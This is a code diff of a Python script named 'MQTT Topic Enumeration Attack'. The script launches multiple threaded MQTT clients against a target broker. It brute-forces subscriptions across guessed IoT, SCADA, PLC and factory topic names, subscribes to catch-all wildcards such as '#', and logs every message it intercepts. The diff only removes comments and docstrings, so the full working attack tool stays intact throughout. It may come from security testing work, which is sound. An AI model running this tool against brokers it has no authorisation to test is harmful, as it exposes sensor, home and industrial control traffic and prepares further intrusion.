@@ -1,5 +1,3 @@
-"""MQTT Topic Enumeration Attack - discovers available topics and topic structures."""
-
 import argparse
 import csv
 import itertools
@@ -10,7 +8,6 @@ import time
 from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
-
 
 class TopicEnumerationAttack:
     def __init__(self, args):
@@ -24,22 +21,18 @@ class TopicEnumerationAttack:
         self.successful_subscriptions = 0
         self.received_messages = 0
         
-        # Common topic patterns to enumerate
         self.topic_patterns = [
-            # IoT device patterns
             "iot/devices/{device_id}/telemetry",
             "iot/sensors/{sensor_type}/{sensor_id}",
             "iot/actuators/{actuator_type}/{actuator_id}",
             "smart/{room}/{device_type}",
             "home/{location}/{sensor}",
             
-            # Industrial patterns  
             "factory/{line}/sensor/{id}",
             "industrial/{zone}/{machine}/status",
             "scada/{system}/{component}",
             "plc/{unit}/{signal}",
             
-            # Common service patterns
             "system/status",
             "system/health",
             "system/config", 
@@ -48,7 +41,6 @@ class TopicEnumerationAttack:
             "debug/trace",
             "test/data",
             
-            # Wildcard patterns for enumeration
             "iot/+/status",
             "system/+/config",
             "devices/+/data",
@@ -58,14 +50,12 @@ class TopicEnumerationAttack:
             "system/#",
         ]
         
-        # Common device/sensor names
         self.device_names = [
             "temp", "humidity", "pressure", "light", "motion", "door", "window", 
             "fan", "heater", "camera", "lock", "alarm", "smoke", "co", "gas",
             "flow", "level", "ph", "conductivity", "turbidity", "chlorine"
         ]
         
-        # Common locations/zones
         self.locations = [
             "living_room", "bedroom", "kitchen", "bathroom", "garage", "office",
             "warehouse", "factory_floor", "control_room", "server_room", "lab",
@@ -101,18 +91,16 @@ class TopicEnumerationAttack:
             ])
 
     def generate_topic_variants(self):
-        """Generate topic variants for enumeration"""
         topics = []
         
-        # Generate from patterns with substitutions
         for pattern in self.topic_patterns:
             if "{device_id}" in pattern:
-                for i in range(1, 101):  # device_id 1-100
+                for i in range(1, 101):
                     topics.append(pattern.format(device_id=f"device_{i:03d}"))
                     
             elif "{sensor_type}" in pattern and "{sensor_id}" in pattern:
-                for sensor_type in self.device_names[:10]:  # Limit to first 10
-                    for i in range(1, 21):  # sensor_id 1-20
+                for sensor_type in self.device_names[:10]:
+                    for i in range(1, 21):
                         topics.append(pattern.format(sensor_type=sensor_type, sensor_id=f"sensor_{i:02d}"))
                         
             elif "{actuator_type}" in pattern and "{actuator_id}" in pattern:
@@ -132,7 +120,6 @@ class TopicEnumerationAttack:
                         topics.append(pattern.format(location=location, sensor=sensor))
                         
             elif any(var in pattern for var in ["{line}", "{zone}", "{machine}", "{system}", "{component}"]):
-                # Industrial patterns
                 for i in range(1, 6):
                     topic = pattern.format(line=f"line_{i}", zone=f"zone_{i}", 
                                          machine=f"machine_{i}", system=f"sys_{i}", 
@@ -140,10 +127,8 @@ class TopicEnumerationAttack:
                                          signal=f"signal_{i}", id=f"id_{i:02d}")
                     topics.append(topic)
             else:
-                # Pattern without variables or wildcards
                 topics.append(pattern)
         
-        # Add some brute force attempts
         for device in self.device_names[:15]:
             topics.extend([
                 f"devices/{device}",
@@ -153,14 +138,12 @@ class TopicEnumerationAttack:
                 f"{device}/config"
             ])
         
-        return list(set(topics))  # Remove duplicates
+        return list(set(topics))
 
     def subscription_enumeration(self, client, client_id):
-        """Enumerate topics by attempting subscriptions"""
         topics_to_test = self.generate_topic_variants()
         print(f"[{client_id}] Testing {len(topics_to_test)} topic variants")
         
-        # Set up message callback
         def on_message(client, userdata, msg):
             topic = msg.topic
             payload_preview = str(msg.payload[:100])[2:-1] if len(msg.payload) > 100 else str(msg.payload)[2:-1]
@@ -175,7 +158,6 @@ class TopicEnumerationAttack:
         
         client.on_message = on_message
         
-        # Test subscriptions in batches
         batch_size = 50
         for i in range(0, len(topics_to_test), batch_size):
             if self.stop_event.is_set():
@@ -200,20 +182,17 @@ class TopicEnumerationAttack:
                     self.log_enumeration(client_id, topic, "subscribe_attempt", 
                                        self.args.qos, status, "", f"result_code={result}")
                     
-                    # Small delay to avoid overwhelming broker
                     time.sleep(0.05)
                     
                 except Exception as e:
                     self.log_enumeration(client_id, topic, "subscribe_attempt", 
                                        self.args.qos, "error", "", str(e))
             
-            # Wait between batches to collect messages
             print(f"[{client_id}] Batch {i//batch_size + 1}/{(len(topics_to_test)-1)//batch_size + 1} complete. "
                   f"Discovered: {len(self.discovered_topics)} topics, "
                   f"Messages: {self.received_messages}")
             time.sleep(2)
         
-        # Keep listening for messages
         print(f"[{client_id}] Enumeration complete. Listening for messages...")
         while not self.stop_event.is_set():
             time.sleep(5)
@@ -222,7 +201,6 @@ class TopicEnumerationAttack:
                       f"Messages received: {self.received_messages}")
 
     def wildcard_enumeration(self, client, client_id):
-        """Use wildcard subscriptions to discover topic hierarchies"""
         wildcard_patterns = [
             "#",  # All topics
             "+/#",  # All subtopics of top level
@@ -256,7 +234,6 @@ class TopicEnumerationAttack:
         
         client.on_message = on_message
         
-        # Subscribe to wildcard patterns
         for pattern in wildcard_patterns:
             if self.stop_event.is_set():
                 break
@@ -270,26 +247,23 @@ class TopicEnumerationAttack:
                                    self.args.qos, status, "", f"result_code={result}")
                 
                 print(f"[{client_id}] Wildcard subscription to: {pattern}")
-                time.sleep(1)  # Allow time for messages
+                time.sleep(1)
                 
             except Exception as e:
                 self.log_enumeration(client_id, pattern, "wildcard_subscribe", 
                                    self.args.qos, "error", "", str(e))
         
-        # Listen for discoveries
         while not self.stop_event.is_set():
             time.sleep(10)
             print(f"[{client_id}] Wildcard enumeration - Discovered: {len(self.discovered_topics)} topics")
 
     def attack_worker(self, worker_id):
-        """Worker thread for topic enumeration"""
         client_id = f"{self.args.client_prefix}_{worker_id:03d}"
         client = mqtt.Client(client_id=client_id, clean_session=True)
         
         if self.args.username:
             client.username_pw_set(self.args.username, self.args.password)
 
-        # Connect to broker
         connected = False
         while not connected and not self.stop_event.is_set():
             try:
@@ -305,7 +279,6 @@ class TopicEnumerationAttack:
             return
 
         try:
-            # Choose enumeration strategy based on worker ID
             if worker_id % 2 == 0:
                 self.subscription_enumeration(client, client_id)
             else:
@@ -319,22 +292,19 @@ class TopicEnumerationAttack:
             print(f"[{client_id}] Disconnected")
 
     def run(self):
-        """Start the topic enumeration attack"""
         print(f"Starting Topic Enumeration attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Strategies: subscription_enumeration, wildcard_enumeration")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
             thread.daemon = True
             thread.start()
             threads.append(thread)
-            time.sleep(1)  # Stagger connections
+            time.sleep(1)
         
         try:
-            # Statistics reporting
             while True:
                 time.sleep(15)
                 print(f"\n=== Topic Enumeration Statistics ===")
@@ -351,7 +321,6 @@ class TopicEnumerationAttack:
             print("\nStopping enumeration...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=10)
             
@@ -363,7 +332,6 @@ class TopicEnumerationAttack:
                 print(f"\nDiscovered topics:")
                 for topic in sorted(self.discovered_topics):
                     print(f"  - {topic}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT Topic Enumeration Attack")
@@ -388,7 +356,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
